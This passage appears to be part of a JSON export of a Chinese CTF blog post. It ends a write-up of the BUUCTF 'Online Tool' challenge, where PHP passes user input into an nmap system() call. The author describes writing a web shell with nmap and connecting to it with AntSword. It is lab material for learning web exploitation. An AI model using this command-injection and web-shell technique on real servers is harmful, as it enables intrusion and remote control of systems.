punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'you are in sandbox '</span><span class=\"token operator\">.</span><span class=\"token variable\">$sandbox</span><span class=\"token punctuation\">;</span>\n    @<span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sandbox</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sandbox</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nmap -T5 -sT -Pn --host-timeout 2 -F \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$host</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>关于这两个函数的学习：<a href=\"https://www.anquanke.com/post/id/107336#h3-7\">https://www.anquanke.com/post/id/107336#h3-7</a></p>\n<p><img src=\"https://s1.ax1x.com/2020/10/25/BmTC1P.png\" alt=\"image 20201025203755259\"></p>\n<p>nmap是可以写shell的,如上写入一个shell到sanbox中，访问一下shell.php并且post传参a进去，或者使用antsword连接都行。</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/25/BmTP6f.png\" alt=\"image 20201025205143537\"></p>\n","text":"[ZJCTF 2019]NiZhuanSiWei考点：代码审计、PHP伪协议 &lt;?php $text = $_GET[\"text\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($text)...","link":"","photos":[],"count_time":{"symbolsCount":"16k","symbolsTime":"15 mins."},"categories":[{"name":"CTF","slug":"CTF","count":43,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"SUCTF","slug":"SUCTF","count":2,"path":"api/tags/SUCTF.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ZJCTF-2019-NiZhuanSiWei\"><span class=\"toc-text\">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World\"><span class=\"toc-text\">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL\"><span class=\"toc-text\">[极客大挑战 2019]HardSQL</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#GXYCTF2019-BabySQli\"><span class=\"toc-text\">[GXYCTF2019]BabySQli</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz\"><span class=\"toc-text\">[网鼎杯 2020 青龙组]AreUSerialz</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2\"><span class=\"toc-text\">[强网杯 2019]高明的黑客</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BJDCTF-2nd-fake-google\"><span class=\"toc-text\">[BJDCTF 2nd]fake google</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#RoarCTF-2019-Easy-Java\"><span class=\"toc-text\">[RoarCTF 2019]Easy Java</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#GYCTF2020-Blacklist\"><span class=\"toc-text\">[GYCTF2020]Blacklist</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BUUCTF-2018-Online-Tool\"><span class=\"toc-text\">[BUUCTF 2018]Online Tool</span></a></li></ol>","author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"CVE-2020-16898 Windows tcp/ip远程代码执行漏洞复现","uid":"78ded4e7cb4de2a6c1a7e1af4840fe78","slug":"CVE-2020-16898-Windows-tcp-ip远程代码执行漏洞复现","date":"2020-10-26T07:03:53.000Z","updated":"2020-10-26T08:24:54.000Z","comments":true,"path":"api/articles/CVE-2020-16898-Windows-tcp-ip远程代码执行漏洞复现.json","keywords":"A1andNS","cover":[],"text":"这个月的微软安全更新日，微软发布了补丁修复，TCP/IP远程执行代码漏洞(CVE-2020-16898),官方评级严重，漏洞评分： 9.8，这里来复现一下漏洞利用，至于照成栈溢出，我就不太知道。 漏洞简述远程攻击者通过 构造特制的ICMPv6 Router Advertiseme...","link":"","photos":[],"count_time":{"symbolsCount":"2.6k","symbolsTime":"2 mins."},"categories":[{"name":"漏洞复现","slug":"漏洞复现","count":4,"path":"api/categories/漏洞复现.json"}],"tags":[{"name":"网络安全","slug":"网络安全","count":32,"path":"api/tags/网络安全.json"},{"name":"漏洞复现","slug":"漏洞复现","count":6,"path":"api/tags/漏洞复现.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"redis未授权访问漏洞复现","uid":"d276b23f1cbe41c451a3655655515353","slug":"redis未授权访问漏洞复现","date":"2020-10-15T08:30:39.000Z","updated":"2020-10-18T06:08:20.000Z","comments":true,"path":"api/articles/redis未授权访问漏洞复现.json","keywords":"A1andNS","cover":[],"text":"之前也遇到存在未授权问题的redis服务。这里熟悉一下redis未授权。 Redis环境搭建 redis version: 3.2.9 Download Link：http://download.redis.io/releases/redis-3.2.9.tar.gz Opera...","link":"","photos":[],"count_time":{"symbolsCount":"3.9k","symbolsTime":"4 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":34,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","count":6,"path":"api/tags/漏洞复现.json"},{"name":"redis","slug":"redis","count":1,"path":"api/tags/redis.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}